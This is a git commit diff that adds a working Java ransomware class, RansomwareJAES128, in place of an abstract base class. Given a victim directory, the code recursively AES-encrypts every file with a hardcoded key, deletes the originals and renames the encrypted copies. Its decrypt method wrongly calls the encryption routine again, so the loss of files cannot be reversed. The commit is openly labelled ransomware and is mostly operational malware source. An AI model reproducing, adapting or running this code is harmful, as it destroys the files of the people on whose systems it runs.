5788fb3f4b097959621828a47fe1d5eb8f4aa3bd
Germán Parisi <germannparisi@gmail.com>
2018-07-24 20:49:49 -0300

    Arreglo longitud de clave AES

--- src/RansomwareJAES128.java
+++ src/RansomwareJAES128.java
@@ -1,53 +1,140 @@
-package datos;
 
-import java.util.TreeMap;
 
-public abstract class Ransomware {
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
 
-    private String name;
-    private String description;
-    private TreeMap<String, String> parameters;
+public class RansomwareJAES128 {
 
-    public Ransomware(String name, String description) {
-        this.name = name;
-        this.description = description;
-        this.parameters = new TreeMap<>();
+    private Cipher cipher;
+    private String clave;
+
+    public RansomwareJAES128() {
+        this.clave = "1234567812345678";
     }
 
-    public String getName() {
-        return name;
+    public void encrypt(String victimDir) throws Exception {
+        String algorithm = "AES";
+        String clearText = clave;
+        if (clearText == null) {
+            throw new RuntimeException("No se especificó una clave");
+        }
+        byte[] key = clearText.getBytes("UTF8");
+        SecretKey secretKey = new SecretKeySpec(key, "AES");
+        cipher = Cipher.getInstance(algorithm);
+        int mode = Cipher.ENCRYPT_MODE;
+        cipher.init(mode, secretKey);
+
+        File file = new File(victimDir);
+        if (file.exists()) {
+            encryptRec(file);
+        } else {
+            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
+        }
+        removeTemporalFileExtension(file);
     }
 
-    public void setName(String name) {
-        this.name = name;
+    /**
+     * This method encrypts a directory and all subdirectories and files from
+     * it.
+     *
+     * @param file
+     */
+    private void encryptRec(File file) throws Exception {
+        if (file.isDirectory()) {
+            File files[] = file.listFiles();
+            for (File a : files) {
+                encryptRec(a);
+                a.delete();
+            }
+        } else {
+            FileInputStream fis = new FileInputStream(file);
+            int readBytesCount;
+            FileOutputStream fos = new FileOutputStream(new File(file.getAbsolutePath() + ".tmp"));
+
+            int inputBlockSize = cipher.getBlockSize();
+            int outputBlockSize = cipher.getOutputSize(inputBlockSize);
+            byte[] inputBytes = new byte[inputBlockSize];
+            byte[] outputBytes = new byte[outputBlockSize];
+
+            do {
+                readBytesCount = fis.read(inputBytes);
+                if (readBytesCount == inputBlockSize) {
+                    int writeBytesCount = cipher.update(inputBytes, 0, inputBlockSize, outputBytes);
+                    fos.write(outputBytes, 0, writeBytesCount);
+                }
+            } while (readBytesCount == inputBlockSize);
+            if (readBytesCount > 0) {
+                outputBytes = cipher.doFinal(inputBytes, 0, readBytesCount);
+            } else {
+                outputBytes = cipher.doFinal();
+            }
+            fos.write(outputBytes);
+            fis.close();
+            fos.close();
+        }
     }
 
-    public String getDescription() {
-        return description;
+    public void decrypt(String victimDir) throws Exception {
+        String algorithm = "AES";
+        String clearText = clave;
+        if (clearText == null) {
+            throw new RuntimeException("No se especificó una clave");
+        }
+        byte[] key = clearText.getBytes("UTF8");
+        SecretKey secretKey = new SecretKeySpec(key, "AES");
+        cipher = Cipher.getInstance(algorithm);
+        int mode = Cipher.DECRYPT_MODE;
+        cipher.init(mode, secretKey);
+
+        File file = new File(victimDir);
+        if (file.exists()) {
+            encryptRec(file);
+        } else {
+            throw new FileNotFoundException("El directorio " + victimDir + " no existe");
+        }
+        removeTemporalFileExtension(file);
     }
 
-    public void setDescription(String description) {
-        this.description = description;
+    private void removeTemporalFileExtension(File file) throws Exception {
+        if (file.isDirectory()) {
+            File files[] = file.listFiles();
+            for (File a : files) {
+                removeTemporalFileExtension(a);
+            }
+        } else {
+            int p = file.getAbsolutePath().lastIndexOf(".");
+            String e = file.getAbsolutePath().substring(0, p);
+            file.renameTo(new File(e));
+        }
     }
 
-    public TreeMap<String, String> getParametros() {
-        return parameters;
+    public static void main(String args[]) {
+        RansomwareJAES128 ransomware = new RansomwareJAES128();
+        String victimDir = null;
+
+        if (args.length >= 1) {
+            victimDir = args[0];
+        }
+        if (victimDir != null) {
+            File file = new File(victimDir);
+            if (file.exists() && file.isDirectory()) {
+                try {
+                    ransomware.encrypt(victimDir);
+                } catch (Exception ex) {
+                    Logger.getLogger(RansomwareJAES128.class.getName()).log(Level.SEVERE, null, ex);
+                }
+            } else {
+                throw new RuntimeException("Directorio inexistente.");
+            }
+        } else {
+            throw new RuntimeException("Directorio nulo.");
+        }
     }
-
-    public void setParameters(TreeMap<String, String> parametros) {
-        this.parameters = parametros;
-    }
-
-    public void addParameter(String key, String value) {
-        this.parameters.put(key, value);
-    }
-
-    @Override
-    public String toString() {
-        return this.name;
-    }
-
-    public abstract void encrypt(String victimDir) throws Exception;
-
-    public abstract void decrypt(String victimDir) throws Exception;
 }
